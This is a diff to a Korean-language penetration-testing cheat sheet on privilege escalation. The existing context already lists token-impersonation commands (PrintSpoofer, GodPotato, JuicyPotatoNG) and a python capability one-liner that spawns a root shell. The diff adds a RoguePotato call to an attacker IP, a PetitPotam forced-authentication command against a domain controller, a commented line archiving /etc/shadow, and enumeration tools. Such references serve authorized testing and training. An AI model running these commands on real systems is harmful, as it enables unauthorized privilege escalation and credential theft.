@@ -31,11 +31,18 @@ whoami /groups
 # PrintSpoofer (SeImpersonatePrivilege)
 PrintSpoofer.exe -i -c cmd
 
-# GodPotato
+# GodPotato (최신 Windows 10/11 및 Server 2019/2022에서 동작)
 GodPotato.exe -cmd "cmd /c whoami"
 
-# JuicyPotatoNG
+# JuicyPotatoNG (차세대 DCOM 기반 토큰 위장)
 JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c whoami"
+
+# RoguePotato (DCOM 원격 활성화를 이용한 토큰 위장, 특정 환경에서 JuicyPotato 대체재)
+RoguePotato.exe -r <attacker_ip> -c "<clsid>" -e "cmd.exe"
+
+# PetitPotam (MS-EFSRPC를 이용한 강제 인증 유도 후 릴레이/위장에 활용)
+# 별도 NTLM 릴레이 서버 필요
+python3 PetitPotam.py -u <user> -p <pass> -d <domain> <listener_ip> <dc_ip>
 ```
 
 !!! warning "탐지"
@@ -188,6 +195,12 @@ getcap -r / 2>/dev/null
 
 # 예: cap_setuid가 설정된 python3
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# 기타 악용 가능 capability 예시:
+# cap_dac_read_search (모든 파일 읽기)
+# /path/to/tar -cvf /tmp/x.tar /etc/shadow
+#
+# cap_sys_admin, cap_sys_ptrace, cap_sys_module (커널 모듈 삽입)
 ```
 
 ### Kernel Exploit
@@ -203,14 +216,20 @@ searchsploit linux kernel <version>
 ### 자동화 도구
 
 ```bash
-# LinPEAS
+# LinPEAS (종합 체크)
 ./linpeas.sh
 
-# LinEnum
+# LinEnum (기초 점검)
 ./LinEnum.sh
 
-# linux-exploit-suggester
+# linux-exploit-suggester (커널 취약점 기반 제안)
 ./linux-exploit-suggester.sh
+
+# pspy (크론/백그라운드 프로세스 실시간 모니터링)
+./pspy64
+
+# SUID3NUM (SUID/SGID 바이너리 자동 탐지 및 GTFOBins 매칭)
+python3 suid3num.py
 ```
 
 ---
